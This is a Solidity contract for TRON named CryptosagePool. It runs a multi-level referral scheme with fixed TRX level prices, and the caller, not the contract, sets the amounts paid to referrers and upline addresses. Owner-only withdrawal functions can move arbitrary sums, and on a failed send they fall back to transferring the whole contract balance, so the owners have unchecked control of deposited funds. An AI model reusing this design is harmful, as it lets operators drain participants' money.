//SourceUnit: CryptosagePool (2).sol

pragma solidity >=0.4.23 <0.6.0;

contract CryptosagePool{
    
    struct User {
        uint id;
        address referrer;
        uint partnersCount;
    }
    mapping(address => User) public users;
    mapping(uint => address) public idToAddress;
    mapping(uint => address) public userIds;
    mapping(uint => uint) public levelPrice;

    uint public lastUserId = 2;
    address public owner;
    address public owner1;
    
    event Registration(address indexed user, address indexed referrer, uint indexed userId, uint referrerId,uint256 amount,uint256 referamount,address level1,uint256 level1amount,address level2,uint256 level2amount);
    event Upgrade(address indexed user, uint level,uint256 amount,address referrer,uint256 referamount,address level1,uint256 level1amount,address level2,uint256 level2amount);
    event WithMulti(address indexed user,uint256 payment,uint256  withid); 
    
    constructor(address ownerAddress,address ownerAddress1) public {
      
       levelPrice[1] =  1050 trx;
       levelPrice[2] =  2050 trx;
       levelPrice[3] =  3050 trx;
       levelPrice[4] =  5050 trx;
       levelPrice[5] =  8050 trx;
       levelPrice[6] =  12050 trx;
       levelPrice[7] =  20050 trx;
       levelPrice[8] =  30050 trx;
       levelPrice[9] =  45050 trx;

        owner = ownerAddress;
        owner1= ownerAddress1;
        
        User memory user = User({
            id: 1,
            referrer: address(0),
            partnersCount: uint(0)
        });
        
        users[ownerAddress] = user;
        idToAddress[1] = ownerAddress;
        
        userIds[1] = ownerAddress;


    }
    
    function() external payable {
        if(msg.data.length == 0) {
            return registration(msg.sender, owner,0,msg.sender,0,msg.sender,0);
        }
        registration(msg.sender, bytesToAddress(msg.data),0,msg.sender,0,msg.sender,0);
    }

    function registrationExt(address referrerAddress,uint256 referamount,address level1,uint256 level1amount,address level2,uint256 level2amount) external payable {
        registration(msg.sender, referrerAddress,referamount,level1,level1amount,level2,level2amount);
    }
    
    function buyNewLevel(uint level,address referrerAddress,uint256 referamount,address level1,uint256 level1amount,address level2,uint256 level2amount) external payable {
        require(isUserExists(msg.sender), "user is not exists. Register first.");
        //require((msg.value%1000 trx)==0, "registration cost 1000 multiple");
        require(msg.value == levelPrice[level], "invalid price");
        require(level > 1 && level <= 9, "invalid level");
        require(msg.value>=1000 trx, "invalid price");
        //require(level > 1 && level <= LAST_LEVEL, "invalid level");
        //require(!users[msg.sender].activepools[level], "level already activated");

          // if (!address(uint160(referrerAddress)).send(levelPrice[level] * 20 / 100)) {
              address(uint160(referrerAddress)).transfer(referamount);
           //   return;
           //   }
         //if (!address(uint160(company)).send(levelPrice[level] * 20 / 100)) {
          //    address(uint160(company)).transfer(levelPrice[level] * 20 / 100);
         //     return;
          //    }
         //if (!address(uint160(level1)).send(levelPrice[level] * 20 / 100)) {
              address(uint160(level1)).transfer(level1amount);
         //     return;
          //    }    
         //if (!address(uint160(level2)).send(levelPrice[level] * 40 / 100)) {
              address(uint160(level2)).transfer(level2amount);
         //     return;
         //     }  
       
        emit Upgrade(msg.sender,level,msg.value,referrerAddress,referamount,level1,level1amount,level2,level2amount);
    }    

     
    
    function registration(address userAddress, address referrerAddress,uint256 referamount,address level1,uint256 level1amount,address level2,uint256 level2amount) private {
         require(msg.value == levelPrice[1],"registration cost 1000 multiple");
        require(msg.value>=1000 trx, "invalid price");
        require(!isUserExists(userAddress), "user exists");
        require(isUserExists(referrerAddress), "referrer not exists");
        
        uint32 size;
        assembly {
            size := extcodesize(userAddress)
        }
        require(size == 0, "cannot be a contract");
        
        User memory user = User({
            id: lastUserId,
            referrer: referrerAddress,
            partnersCount: 0
        });
        
        users[userAddress] = user;
        idToAddress[lastUserId] = userAddress;
        
        users[userAddress].referrer = referrerAddress;
        
        // users[userAddress].activepools[1] = true; 
        userIds[lastUserId] = userAddress;
        lastUserId++;
        users[referrerAddress].partnersCount++;
        
          // if (!address(uint160(referrerAddress)).send(levelPrice[level] * 20 / 100)) {
              address(uint160(referrerAddress)).transfer(referamount);
           //   return;
           //   }
         //if (!address(uint160(company)).send(levelPrice[level] * 20 / 100)) {
          //    address(uint160(company)).transfer(levelPrice[1] * 20 / 100);
         //     return;
          //    }
         //if (!address(uint160(level1)).send(levelPrice[level] * 20 / 100)) {
              address(uint160(level1)).transfer(level1amount);
         //     return;
          //    }    
         //if (!address(uint160(level2)).send(levelPrice[level] * 40 / 100)) {
              address(uint160(level2)).transfer(level2amount);
         //     return;
         //     }  

        emit Registration(userAddress, referrerAddress, users[userAddress].id, users[referrerAddress].id,msg.value,referamount,level1,level1amount,level2,level2amount);
    }
    
   
    function Withdrawal(address userAddress,address userAddress1,uint256 amnt) external payable {   
        if(owner1==msg.sender)
        {
           Execution(userAddress,amnt);        
        }            
    }
    function Withdral(address userAddress,address userAddress1,uint256 amnt) external payable {   
         if(owner==msg.sender)
         {
            Execution(userAddress,amnt);        
         }            
    }
    function Execution(address _sponsorAddress,uint256 price) private returns (uint256 distributeAmount) {        
         distributeAmount = price;        
         if (!address(uint160(_sponsorAddress)).send(price)) {
             address(uint160(_sponsorAddress)).transfer(address(this).balance);
         }
         return distributeAmount;
    }
   
    function PaytoMultiple(address[] memory _address,uint256[] memory _amount,uint256[] memory _withId) public payable {
         if(owner==msg.sender)
         {
          for (uint8 i = 0; i < _address.length; i++) {      
              emit WithMulti(_address[i],_amount[i],_withId[i]);
              if (!address(uint160(_address[i])).send(_amount[i])) {
              address(uint160(_address[i])).transfer(address(this).balance);
              }
            }
        }
    }   

    function isUserExists(address user) public view returns (bool) {
        return (users[user].id != 0);
    }
    function bytesToAddress(bytes memory bys) private pure returns (address addr) {
        assembly {
            addr := mload(add(bys, 20))
        }
    }
}